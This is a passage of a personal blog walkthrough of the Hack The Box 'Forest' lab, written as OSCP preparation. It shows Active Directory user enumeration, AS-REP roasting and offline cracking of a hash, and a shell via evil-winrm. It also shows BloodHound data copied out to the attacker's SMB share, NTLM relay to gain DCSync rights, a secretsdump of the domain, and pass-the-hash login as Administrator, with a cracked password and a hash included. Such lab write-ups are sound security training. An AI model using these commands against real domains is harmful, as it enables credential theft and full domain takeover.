+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">rpcclient $&gt; queryuser 0x1f4            </span><br><span class="line">        User Name   :   Administrator</span><br><span class="line">        Full Name   :   Administrator</span><br><span class="line">        Home Drive  :   </span><br><span class="line">        Dir Drive   :      </span><br><span class="line">        Profile Path:      </span><br><span class="line">        Logon Script:</span><br><span class="line">        Description :   Built-in account for administering the computer/domain</span><br><span class="line">        Workstations:</span><br><span class="line">        Comment     :</span><br><span class="line">        Remote Dial :</span><br><span class="line">        Logon Time               :      Mon, 07 Oct 2019 06:57:07 EDT</span><br><span class="line">        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST</span><br><span class="line">        Kickoff Time             :      Wed, 31 Dec 1969 19:00:00 EST</span><br><span class="line">        Password last set Time   :      Wed, 18 Sep 2019 13:09:08 EDT</span><br><span class="line">        Password can change Time :      Thu, 19 Sep 2019 13:09:08 EDT</span><br><span class="line">        Password must change Time:      Wed, 30 Oct 2019 13:09:08 EDT</span><br><span class="line">        unknown_2[0..31]...</span><br><span class="line">        user_rid :      0x1f4</span><br><span class="line">        group_rid:      0x201</span><br><span class="line">        acb_info :      0x00000010</span><br><span class="line">        fields_present: 0x00ffffff</span><br><span class="line">        logon_divs:     168</span><br><span class="line">        bad_password_count:     0x00000000</span><br><span class="line">        logon_count:    0x00000031</span><br><span class="line">        padding1[0..7]...</span><br><span class="line">        logon_hrs[0..21]...</span><br></pre></td></tr></table></figure>
+
+<h3 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a>enum4linux</h3><p>​	Also,we can use enum4linux tool to gather this infomation autoly.And I just paste a user-information part of it below.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">user:[Administrator] rid:[0x1f4]                            </span><br><span class="line">user:[Guest] rid:[0x1f5]                                    </span><br><span class="line">user:[krbtgt] rid:[0x1f6]                                   </span><br><span class="line">user:[DefaultAccount] rid:[0x1f7]                           </span><br><span class="line">user:[$331000-VK4ADACQNUCA] rid:[0x463]                     </span><br><span class="line">user:[SM_2c8eef0a09b545acb] rid:[0x464]                     </span><br><span class="line">user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]                     </span><br><span class="line">user:[SM_75a538d3025e4db9a] rid:[0x466]                     </span><br><span class="line">user:[SM_681f53d4942840e18] rid:[0x467]                     </span><br><span class="line">user:[SM_1b41c9286325456bb] rid:[0x468]                     </span><br><span class="line">user:[SM_9b69f1b9d2cc45549] rid:[0x469]                     </span><br><span class="line">user:[SM_7c96b981967141ebb] rid:[0x46a]                     </span><br><span class="line">user:[SM_c75ee099d0a64c91b] rid:[0x46b]                     </span><br><span class="line">user:[SM_1ffab36a2f5f479cb] rid:[0x46c]                     </span><br><span class="line">user:[HealthMailboxc3d7722] rid:[0x46e]                     </span><br><span class="line">user:[HealthMailboxfc9daad] rid:[0x46f]                     </span><br><span class="line">user:[HealthMailboxc0a90c9] rid:[0x470]                     </span><br><span class="line">user:[HealthMailbox670628e] rid:[0x471]                     </span><br><span class="line">user:[HealthMailbox968e74d] rid:[0x472]                     </span><br><span class="line">user:[HealthMailbox6ded678] rid:[0x473]                     </span><br><span class="line">user:[HealthMailbox83d6781] rid:[0x474]                     </span><br><span class="line">user:[HealthMailboxfd87238] rid:[0x475]                     </span><br><span class="line">user:[HealthMailboxb01ac64] rid:[0x476]                     </span><br><span class="line">user:[HealthMailbox7108a4e] rid:[0x477]                     </span><br><span class="line">user:[HealthMailbox0659cc1] rid:[0x478]                     </span><br><span class="line">user:[sebastien] rid:[0x479]                                </span><br><span class="line">user:[lucinda] rid:[0x47a]                                  </span><br><span class="line">user:[svc-alfresco] rid:[0x47b]                             </span><br><span class="line">user:[andy] rid:[0x47e]                                     </span><br><span class="line">user:[mark] rid:[0x47f]                                     </span><br><span class="line">user:[santi] rid:[0x480] </span><br></pre></td></tr></table></figure>
+
+<h2 id="Shell-Gain"><a href="#Shell-Gain" class="headerlink" title="Shell-Gain"></a>Shell-Gain</h2><h3 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><p>​	With above actions,we can get a list of user.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">lucinda</span><br><span class="line">svc-alfresco</span><br><span class="line">andy</span><br><span class="line">mark</span><br><span class="line">santi</span><br></pre></td></tr></table></figure>
+
+<p>​	And the port 88 is open.We can try to use <code>AS-REP Roastring attack</code>.Typically,kerberoasting  requires credentials on the domain to authenticate with.However,if an account have the property for “Do not require Kerberos preauthentication” or <code>UF_DONT_REQUIRE_PREAUTH</code> set to true.That attack could play a role.</p>
+<p>​	We can use <code>GetNPUsers.py</code> from impacket to launch a attack.And get hash for svc-alfresco.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/…/WeaponizingTools/Domain-penetration/impacket/examples]</span><br><span class="line">└─$ ./GetNPUsers.py -dc-ip 10.10.10.161 -usersfile ~/RedTeamNote/Walkthrough/Forest/users -format john -outputfile hash4user -no-pass htb.local/</span><br><span class="line"></span><br><span class="line">$krb5asrep$svc-alfresco@HTB.LOCAL:36d75ad85a1792d93e9a0f9eb8d654f1$bbe1411147e7cfbf3c6201ce152f35cadf0d53aa248ff5671b4f46909f03dae560e7062ef44767a5f2186db42278874d8aecb70fc1d343a9a16d0557d25df5d6bf5b232700673e8e5c68f3747c972f671e3cbe6d123aca0568041e8d6af953a5f0f936cd84731e4c12bd3f516fda3aca7042ce1ca98b6c851546e85cb9130028c700cc542500ea3a75454b309724eda4da0ba0f702cfd0f433c948a1ff0342681d8106b23458b77ecbb034731366ce07585d6ef9be49baab42a1768f98d10a5a93cc2f3af1b309c2cf815de28a4370c0c8699f1bf785ace775fd88b291aa5b63390e32f397d9</span><br></pre></td></tr></table></figure>
+
+<h3 id="Crack-the-Hash"><a href="#Crack-the-Hash" class="headerlink" title="Crack the Hash"></a>Crack the Hash</h3><p>​	use john to crack it.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">john hash4user --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(sollupus㉿kali)-[~/RedTeamNote/Walkthrough/Forest]</span><br><span class="line">└─$ john  --show hash4user        </span><br><span class="line">$krb5asrep$svc-alfresco@HTB.LOCAL:s3rvice</span><br></pre></td></tr></table></figure>
+
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/RedTeamNote/Walkthrough/Forest]</span><br><span class="line">└─$ evil-winrm -i 10.10.10.161 -u svc-alfresco@HTB.LOCAL</span><br></pre></td></tr></table></figure>
+
+<img src="/undefined/undefined/image-20230312212800728.png" class="">
+
+<h2 id="Privesc-to-Administrator"><a href="#Privesc-to-Administrator" class="headerlink" title="Privesc to Administrator"></a>Privesc to Administrator</h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><h4 id="Sharphound"><a href="#Sharphound" class="headerlink" title="Sharphound"></a>Sharphound</h4><p>With shell,we can use sharphound.exe to collect information for Bloodhound.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop&gt; upload /home/sollupus/RedTeamNote/WeaponizingTools/Domain-penetration/Tools/Sharphood/SharpHound.exe c:\tmp\sharp.exe</span><br></pre></td></tr></table></figure>
+
+<img src="/undefined/undefined/image-20230312213156062.png" class="">
+
+<img src="/undefined/undefined/image-20230312213327732.png" class="">
+
+<p>Then get it to local machine.I use smbserver to get that target.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/…/WeaponizingTools/Domain-penetration/impacket/examples]</span><br><span class="line">└─$ ./smbserver.py share /home/sollupus/RedTeamNote/Walkthrough/Forest -smb2support -username a -password a</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\tmp&gt;net use \\10.10.16.8\share /u:a a</span><br><span class="line">*Evil-WinRM* PS C:\tmp&gt;copy 20230312045852_BloodHound.zip \\10.10.16.8\share\</span><br><span class="line">*Evil-WinRM* PS C:\tmp&gt;del 20230312045852_BloodHound.zip</span><br><span class="line">*Evil-WinRM* PS C:\tmp&gt;net use /d \\10.10.16.8\share</span><br></pre></td></tr></table></figure>
+
+<p>Then upload it to BloodHound.And use that quey to find the shortest way from owner to administrator.</p>
+<img src="/undefined/undefined/image-20230312213915439.png" class="">
+
+<p>With that graph,we can know owner is belong to group <code>EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL</code>,which means that you have privilege to modify domain ACL.</p>
+<h3 id="NTLM-relay"><a href="#NTLM-relay" class="headerlink" title="NTLM-relay"></a>NTLM-relay</h3><p>1.Firstly, add <code>svc-alfresco</code> to group <code>Exchange Windows Permissions</code>.</p>
+<img src="/undefined/undefined/image-20230312214603499.png" class="">
+
+
+
+<p>2.Then Run the <code>ntlmrelayx.py</code> man-in-the-middle (“mitm”) tool with the <code>--escalate-user</code> flag. What this will essentially do is when it identifies the login  attempt of the “svc-alfresco” user on the same network, it will mitm to  automatically check the user privileges, and if it can modify the domain ACL, it will modify the user permissions to add <code>Replication-Get-Changes-All</code> privileges to the user account, which can do a DCSync.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/…/WeaponizingTools/Domain-penetration/impacket/examples]</span><br><span class="line">└─$ ./ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user svc-alfresco </span><br></pre></td></tr></table></figure>
+
+<img src="/undefined/undefined/image-20230312214801416.png" class="">
+
+<p>3.Then, we will do a random authentication using the <code>svc-alfresco</code>  account. In this case, I used <code>psexec.py</code> to do an authenticate attempt against my own Kali box.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/…/WeaponizingTools/Domain-penetration/impacket/examples]</span><br><span class="line">└─$ ./psexec.py htb.local/svc-alfresco:s3rvice@10.10.16.8</span><br></pre></td></tr></table></figure>
+<img src="/undefined/undefined/image-20230312215108184.png" class="">
+
+<p>​	Obviously,<code>psexec.py</code> will failed because there is no smb server runing in my kali box.However,<code>ntlmrelayx.py</code> will capture authentication attempt of the <code>htb.local/svc-alfresco</code> to the <code>ldap://10.10.10.161</code>.And since it is valid credentials to the Forces box, it will successfully authenticate and escalate our privileges to add <code>Replication-Get-Changes-All</code>.</p>
+<h3 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h3><p>Then we can use <code>secretdump.py</code> to dump the Administrator’s NTML hash.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/…/WeaponizingTools/Domain-penetration/impacket/examples]</span><br><span class="line">└─$ ./secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161</span><br></pre></td></tr></table></figure>
+<img src="/undefined/undefined/image-20230312215522843.png" class="">
+
+<p>Then use evil-winrm ,we can connect to forest box as Administrator.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/…/WeaponizingTools/Domain-penetration/impacket/examples]</span><br><span class="line">└─$ evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 </span><br></pre></td></tr></table></figure>
+
+<p>And that means we get this Dc,and root.txt is in Administrator’s desktop.</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/OSCP%E5%A4%87%E8%80%83/" rel="tag"># OSCP备考</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/undefined/236928b6.html" rel="prev" title="Road to OSCP-3 Soccer">
+      <i class="fa fa-chevron-left"></i> Road to OSCP-3 Soccer
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/undefined/6c59522f.html" rel="next" title="CVE-2023-21839--Weblogic-复现">
+      CVE-2023-21839--Weblogic-复现 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Forest"><span class="nav-number">1.</span> <span class="nav-text">Forest</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Box-info"><span class="nav-number">1.1.</span> <span class="nav-text">Box info</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Recon"><span class="nav-number">1.2.</span> <span class="nav-text">Recon</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap"><span class="nav-number">1.2.1.</span> <span class="nav-text">nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS"><span class="nav-number">1.2.2.</span> <span class="nav-text">DNS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#smb"><span class="nav-number">1.2.3.</span> <span class="nav-text">smb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RPC"><span class="nav-number">1.2.4.</span> <span class="nav-text">RPC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#enum4linux"><span class="nav-number">1.2.5.</span> <span class="nav-text">enum4linux</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shell-Gain"><span class="nav-number">1.3.</span> <span class="nav-text">Shell-Gain</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AS-REP-Roasting"><span class="nav-number">1.3.1.</span> <span class="nav-text">AS-REP Roasting</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Crack-the-Hash"><span class="nav-number">1.3.2.</span> <span class="nav-text">Crack the Hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getshell"><span class="nav-number">1.3.3.</span> <span class="nav-text">getshell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privesc-to-Administrator"><span class="nav-number">1.4.</span> <span class="nav-text">Privesc to Administrator</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Enumeration"><span class="nav-number">1.4.1.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Sharphound"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">Sharphound</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-relay"><span class="nav-number">1.4.2.</span> <span class="nav-text">NTLM-relay</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DCSync"><span class="nav-number">1.4.3.</span> <span class="nav-text">DCSync</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">So1Lupus</p>
+  <div class="site-description" itemprop="description">So1Lupus的个人博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备2022029346号 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">So1Lupus</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
